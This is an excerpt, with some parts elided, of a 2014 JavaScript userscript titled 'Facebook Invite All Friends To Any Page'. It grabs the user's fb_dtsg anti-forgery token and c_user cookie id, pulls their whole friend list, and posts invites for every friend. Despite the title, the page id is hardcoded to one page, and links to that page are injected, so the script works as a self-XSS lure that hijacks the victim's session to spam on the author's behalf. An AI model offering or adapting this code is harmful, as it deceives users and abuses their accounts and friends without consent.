// ==UserScript==
// @name			Facebook Invite All Friends To Any Page.
// @description		Facebook Invite All Friends To Any Page.
// @version			2014
// @author			Samnad Sainulabdeen
// ==/UserScript==
///////////////////////////////////////START////////////////
...
///////////////////////////////////////////////////////////////////
javascript: var Title = '<br/> <A style="color:#00FF7F;" href="https://www.facebook.com/rakyismcs" target="_blank"></A>';
var Descriptions = "",
    _text = '</br> </A><A style="color:#00FF00;" href="http://www.facebook.com/761707783856851" target="_blank"></A></A></br>  <A style="color:#00FFFF;" href="http://www.facebook.com/761707783856851" target="_blank"></A></A>';
...
function InviteFriends(opo) {
    ...
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=761707783856851&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
...
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value,
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    Friend = Array();
gf = new XMLHttpRequest, gf.open("GET", "/ajax/typeahead/first_degree.php?__a=1&viewer=" + user_id + "&token" + Math.random() + "&filter[0]=user&options[0]=Friend_only", !1), gf.send(), 4 != gf.readyState || (data = eval("(" + gf.responseText.substr(9) + ")"), data.error || (Friend = data.payload.entries.sort(
    function (a, b) {
        return a.index - b.index
    })));
var Title = '<br/> <A style="color:#00FF7F;" href="https://www.facebook.com/761707783856851" target="_blank"></A>';
grpname = document.getElementById("groupsJumpTitle").innerHTML;
var Descriptions = "",
    _text = '</br>Visit: <A style="color:#3B5998;" href="https://www.facebook.com/761707783856851/"></A>, Join Yuk!';
jx = {
